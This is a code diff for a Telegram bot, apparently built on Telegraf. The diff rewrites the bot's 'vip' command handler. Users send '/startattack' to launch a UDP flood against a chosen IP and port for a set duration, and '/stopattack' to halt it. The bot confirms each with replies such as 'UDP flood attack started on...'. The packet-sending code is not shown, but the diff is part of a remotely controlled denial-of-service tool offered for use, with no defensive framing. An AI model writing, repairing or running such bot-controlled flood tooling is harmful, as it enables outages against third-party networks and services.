@@ -59,10 +59,10 @@ bot.command('bc', (ctx) => {
     }
 });
 
-bot.on('vip', (msg) => {
-    const chatId = msg.chat.id;
-    const vipText = msg.text ? msg.text.toLowerCase() : '';
-    const caption = msg.caption ? msg.caption.toLowerCase() : '';
+bot.command('vip', (ctx) => {
+    const chatId = ctx.chat.id;
+    const vipText = ctx.message.text ? ctx.message.text.toLowerCase() : '';
+    const caption = ctx.message.caption ? ctx.message.caption.toLowerCase() : '';
 
     if ((vipText === '/startattack' || caption.startsWith('/startattack')) && !attacking) {
         attacking = true;
@@ -100,10 +100,12 @@ bot.on('vip', (msg) => {
 
         sendPacket();
 
-        bot.sendvip(chatId, `UDP flood attack started on ${targetIP}:${targetPort} for ${duration} seconds`);
+        ctx.reply(`UDP flood attack started on ${targetIP}:${targetPort} for ${duration} seconds`);
     } else if (vipText === '/stopattack' && attacking) {
         attacking = false;
-        bot.sendvip(chatId, 'Attack stopped');
+        ctx.reply('Attack stopped');
+    } else {
+        ctx.reply('Perintah tidak valid.');
     }
 });
 
